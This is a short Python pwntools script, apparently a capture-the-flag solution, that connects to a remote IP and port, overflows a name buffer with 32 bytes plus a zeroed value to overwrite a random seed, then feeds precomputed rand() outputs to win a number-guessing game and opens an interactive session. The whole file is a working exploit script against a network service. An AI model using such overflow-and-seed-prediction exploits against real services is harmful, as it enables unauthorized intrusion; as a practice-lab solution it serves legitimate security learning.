from pwn import *
import random
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
t = remote('111.198.29.45', 31405)
payload = 'a' * 32 + p64(0x0)
t.sendlineafter('Your name:', payload)
random.seed(1)
ans = [1804289383,846930886,1681692777,1714636915,1957747793,424238335,719885386,1649760492,596516649,1189641421]
for i in ans:
	t.sendlineafter('Please input your guess number:',str(i % 6 + 1))

t.interactive()
